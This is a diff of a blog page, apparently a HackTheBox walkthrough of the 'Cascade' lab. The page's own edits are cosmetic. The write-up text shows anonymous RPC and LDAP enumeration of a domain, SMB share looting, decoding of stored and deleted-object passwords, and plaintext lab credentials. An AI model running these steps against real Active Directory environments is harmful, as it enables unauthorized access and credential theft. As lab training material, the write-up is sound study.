@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;235  10.10.10.182  端口扫描windows服务器，没有web，开了域相关端口">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;235  10.10.10.182  端口扫描windows服务器，没有web，开了域相关端口  135RPC可以匿名访问，直接用rpcclient 1234567891011121314151617181920212223242526272829rpcclient 10.10.10.182">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Cascade - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2020/05/17/Cascade-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;235  10.10.10.182  端口扫描windows服务器，没有web，开了域相关端口">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;235  10.10.10.182  端口扫描windows服务器，没有web，开了域相关端口  135RPC可以匿名访问，直接用rpcclient 1234567891011121314151617181920212223242526272829rpcclient 10.10.10.182">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051101.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051601.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051602.jpg">
@@ -130,8 +130,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -153,7 +160,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -222,102 +229,39 @@
 <li><h2 id="10-10-10-182"><a href="#10-10-10-182" class="headerlink" title="10.10.10.182"></a>10.10.10.182</h2></li>
 </ul>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>windows服务器，没有web，开了域相关端口</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051101.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051101.jpg" alt=""></p>
 <h2 id="135"><a href="#135" class="headerlink" title="135"></a>135</h2><p>RPC可以匿名访问，直接用rpcclient</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">rpcclient 10.10.10.182 -U ""</span><br><span class="line">Enter WORKGROUP\'s password:</span><br><span class="line">rpcclient $&gt; enumdomusers</span><br><span class="line">user:[CascGuest] rid:[0x1f5]</span><br><span class="line">user:[arksvc] rid:[0x452]</span><br><span class="line">user:[s.smith] rid:[0x453]</span><br><span class="line">user:[r.thompson] rid:[0x455]</span><br><span class="line">user:[util] rid:[0x457]</span><br><span class="line">user:[j.wakefield] rid:[0x45c]</span><br><span class="line">user:[s.hickson] rid:[0x461]</span><br><span class="line">user:[j.goodhand] rid:[0x462]</span><br><span class="line">user:[a.turnbull] rid:[0x464]</span><br><span class="line">user:[e.crowe] rid:[0x467]</span><br><span class="line">user:[b.hanson] rid:[0x468]</span><br><span class="line">user:[d.burman] rid:[0x469]</span><br><span class="line">user:[BackupSvc] rid:[0x46a]</span><br><span class="line">user:[j.allen] rid:[0x46e]</span><br><span class="line">user:[i.croft] rid:[0x46f]</span><br><span class="line">rpcclient $&gt; enumdomgroups</span><br><span class="line">group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]</span><br><span class="line">group:[Domain Users] rid:[0x201]</span><br><span class="line">group:[Domain Guests] rid:[0x202]</span><br><span class="line">group:[Domain Computers] rid:[0x203]</span><br><span class="line">group:[Group Policy Creator Owners] rid:[0x208]</span><br><span class="line">group:[DnsUpdateProxy] rid:[0x44f]</span><br><span class="line">rpcclient $&gt; enumdomains</span><br><span class="line">name:[CASCADE] idx:[0x0]</span><br><span class="line">name:[Builtin] idx:[0x0]</span><br><span class="line">rpcclient $&gt;</span><br></pre></td></tr></table></figure>
 
 <h2 id="enum-enum-enum"><a href="#enum-enum-enum" class="headerlink" title="enum enum enum"></a>enum enum enum</h2><p>之后就是各种enum：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat raw.txt | while read line; do echo $line | cut -d' ' -f2 | cut -d':' -f2 | cut -d'[' -f2 | cut -d']' -f1;done &gt; user.txt</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051601.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051601.jpg" alt=""></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt | while read line; do rpcclient -U "" --no-pass -c="queryuser $line" 10.10.10.182;sleep 1;done &gt; userinfo.txt</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051602.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051602.jpg" alt=""></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat raw.txt | while read line; do echo $line | cut -d' ' -f1 | cut -d':' -f2 | cut -d'[' -f2 | cut -d']' -f1;done &gt; user_name.txt</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051603.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051603.jpg" alt=""></p>
 <p> 现在只有一些用户信息</p>
 <h2 id="389"><a href="#389" class="headerlink" title="389"></a>389</h2><p>389是ldap</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -h 10.10.10.182 -p 389 -x -b "dc=cascade,dc=local" &gt; ldap_info.txt</span><br></pre></td></tr></table></figure>
 
 <p>结果中信息非常多，仔细搜寻</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051604.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051604.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cn: Ryan Thompson</span><br><span class="line">sn: Thompson</span><br><span class="line">givenName: Ryan</span><br><span class="line">distinguishedName: CN&#x3D;Ryan Thompson,OU&#x3D;Users,OU&#x3D;UK,DC&#x3D;cascade,DC&#x3D;local</span><br><span class="line"></span><br><span class="line">cascadeLegacyPwd: clk0bjVldmE&#x3D; # base64 decode : rY4n5eva</span><br></pre></td></tr></table></figure>
 
 <p>  现在我们得到一组账号密码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.thompson : rY4n5eva</span><br></pre></td></tr></table></figure>
 
 <h1 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h1><p>这个账号直接使用evil-winrm失败，smbclient可以使用：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051605.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051605.jpg" alt=""></p>
 <h2 id="Data-IT"><a href="#Data-IT" class="headerlink" title="Data\IT"></a>Data\IT</h2><p>下载IT目录：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051606.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051606.jpg" alt=""></p>
 <p>这个文件有部分信息：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051607.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051607.jpg" alt=""></p>
 <p> 这个log中有一个密码信息：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051608.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051608.jpg" alt=""></p>
 <p>  这个密码如果直接按hex解的话是错的，直接搜索”VNC Install.reg password”能够找到相关资料：</p>
 <ul>
 <li><a href="https://github.com/frizb/PasswordDecrypts" target="_blank" rel="noopener">https://github.com/frizb/PasswordDecrypts</a></li>
@@ -331,62 +275,18 @@
 
 
 <h2 id="NETLOGON"><a href="#NETLOGON" class="headerlink" title="NETLOGON"></a>NETLOGON</h2><p>NETLOGON中有两个vbs文件：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051609.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051610.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051609.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051610.jpg" alt=""></p>
 <h2 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h2><p>把这个目录下载下来，因为Groups.xml中可能存在用户名和密码(GPP):</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051611.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051611.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p> 上一步我们已经得到了s.smith的账号密码，使用这个账号登录，得到user.txt:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.smith ： sT333ve2</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051612.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051612.jpg" alt=""></p>
 <h1 id="enum-more"><a href="#enum-more" class="headerlink" title="enum more"></a>enum more</h1><p>使用s.smith账号继续进行信息搜集：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051613.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051613.jpg" alt=""></p>
 <h2 id="Audit-DB"><a href="#Audit-DB" class="headerlink" title="Audit$\DB"></a>Audit$\DB</h2><p>这个目录下有一个db文件，下载下来查看，是sqlite3:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051614.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051614.jpg" alt=""></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlite3 Audit.db</span><br><span class="line">SQLite version 3.31.1 2020-01-27 19:55:54</span><br><span class="line">Enter ".help" for usage hints.</span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> .tables</span></span><br><span class="line">DeletedUserAudit  Ldap              Misc</span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select * from DeletedUserAudit;</span></span><br><span class="line">6|test|Test</span><br><span class="line">DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local</span><br><span class="line">7|deleted|deleted guy</span><br><span class="line">DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local</span><br><span class="line">9|TempAdmin|TempAdmin</span><br><span class="line">DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local</span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select * from Ldap;</span></span><br><span class="line">1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local</span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"> select * from misc;</span></span><br><span class="line"><span class="meta">sqlite&gt;</span><span class="bash"></span></span><br></pre></td></tr></table></figure>
 
 <p>ldap中得到信息，但直接base64解的话是乱码，直接搜这串base64能够搜到相关信息：</p>
@@ -395,47 +295,19 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ArkSvc ： w3lc0meFr31nd</span><br></pre></td></tr></table></figure>
 
 <h2 id="IT-Logs-Ark-AD-Recycle-Bin"><a href="#IT-Logs-Ark-AD-Recycle-Bin" class="headerlink" title="IT\Logs\Ark AD Recycle Bin"></a>IT\Logs\Ark AD Recycle Bin</h2><p>ArkAdRecycleBin.log中存在相关信息，可以看到之前看到的TempAdmin是被ArkSvc用户删除的:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051615.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051615.jpg" alt=""></p>
 <h1 id="AD-Object"><a href="#AD-Object" class="headerlink" title="AD Object"></a>AD Object</h1><p>搜索上面显示的Ark AD Recycle Bin Manager能够找到相关资料：</p>
 <p>Active Directory Recycle Bin | Recover Deleted AD Object | AD Deleted Objects<br><a href="https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/" target="_blank" rel="noopener">https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADOptionalFeature -Filter *</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051616.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051616.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -ldapFilter:&quot;(msDS-LastKnownRDN&#x3D;*)&quot; –IncludeDeletedObjects</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051617.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051617.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -Filter &#123;DisplayName -like &#39;TempAdmin&#39;&#125; -IncludeDeletedObjects | Restore-ADObject</span><br></pre></td></tr></table></figure>
 
 <p>直接尝试恢复的话，失败：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051618.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051618.jpg" alt=""></p>
 <p> 修改过滤条件继续搜寻信息：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$changeDate &#x3D; New-Object dateTime(2008,11,18,1,40,02)</span><br><span class="line">Get-ADObject -Filter &#39;whenChanged -gt $changeDate -and isDeleted -eq $true -and -not (isRecycled -eq $true) -and name -ne &quot;Deleted Objects&quot;&#39; -IncludeDeletedObjects</span><br><span class="line"></span><br><span class="line">Get-ADObject -Filter &#123;displayName -eq &quot;TempAdmin&quot;&#125; -IncludeDeletedObjects -Properties *</span><br><span class="line"></span><br><span class="line">cascadeLegacyPwd               YmFDVDNyMWFOMDBkbGVz</span><br></pre></td></tr></table></figure>
 
@@ -443,16 +315,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baCT3r1aN00dles</span><br></pre></td></tr></table></figure>
 
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p> 根据前面的邮件，TempAdmin的密码和Administrator密码相同，直接登录，得到root.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051619.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
-
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020051619.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><p><a href="https://github.com/frizb/PasswordDecrypts" target="_blank" rel="noopener">https://github.com/frizb/PasswordDecrypts</a></p>
 </li>
@@ -477,7 +340,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2020-07-27T00:51:57.818Z" itemprop="dateUpdated">2020-07-27 08:51:57</time>
+    Last updated: <time datetime="2020-07-27T00:51:57.818Z" itemprop="dateUpdated">2020-07-27 08:51:57</time>
 </span><br>
 
 
@@ -644,11 +507,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
